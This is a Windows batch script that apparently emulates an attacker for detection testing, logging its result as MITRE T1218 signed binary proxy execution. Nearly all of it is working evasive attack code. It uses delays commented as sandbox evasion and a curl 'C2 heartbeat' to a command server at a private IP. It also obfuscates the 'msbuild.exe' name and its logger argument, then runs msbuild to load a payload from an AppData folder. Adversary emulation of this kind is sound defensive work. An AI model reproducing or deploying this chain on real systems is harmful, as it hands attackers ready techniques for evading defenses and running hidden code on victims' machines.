@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8352\5a53bb59
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8352-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=visio.txt
SET dvhhyc=8352

REM Setup log file path
SET logf=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial sandbox evasion delay (30-60s)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start>> "!logf!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>> "!logf!" 2>nul

REM C2 HEARTBEAT - must be first operation
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!logf!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!logf!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay1_start>> "!logf!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay1_complete>> "!logf!" 2>nul

REM Build msbuild.exe using character-by-character assembly
SET c1=m
SET c2=s
SET c3=b
SET c4=u
SET c5=i
SET c6=l
SET c7=d
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET lolbin=!c1!!c2!!c3!!c4!!c5!!c6!!c7!!c8!!c9!!c10!!c11!

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: lolbin_built=!lolbin!>> "!logf!" 2>nul

REM Delay before command building
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay2_start>> "!logf!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay2_complete>> "!logf!" 2>nul

REM Build command parts using string substitution encoding
SET encoded1=/XYZgger:LoXXerEntry,
SET part1=!encoded1:XYZ=l!
SET part1=!part1:X=g!
SET part1=!part1:Y=!
SET part1=!part1:!=!

SET encoded2=;MyParameXers,Foo
SET part2=!encoded2:X=t!

REM Construct full command path
SET fullpath=!txisnba!\!xzanpex!

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: command_parts_built>> "!logf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: fullpath=!fullpath!>> "!logf!" 2>nul

REM Random delay for evasion
SET /A rdelay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!rdelay!s>> "!logf!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>> "!logf!" 2>nul

REM Execute msbuild with .NET DLL logger
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: command_execution_start>> "!logf!" 2>nul
SET TTP_RESULT=0
SET TTP_ERROR=

!lolbin! !part1!!fullpath!!part2!
IF !ERRORLEVEL! EQU 0 (
    SET TTP_RESULT=1
    SET TTP_ERROR=
) ELSE (
    SET TTP_ERROR=assembly_load_failed
)

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: command_execution_complete, errorlevel=!ERRORLEVEL!>> "!logf!" 2>nul

REM TTP logging for MITRE T1218
SET timestamp=!DATE! !TIME!
SET logline=[!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!TTP_RESULT!:!TTP_ERROR!
echo !logline!>> "!logf!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start>> "!logf!" 2>nul
timeout /t 15 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete>> "!logf!" 2>nul

ENDLOCAL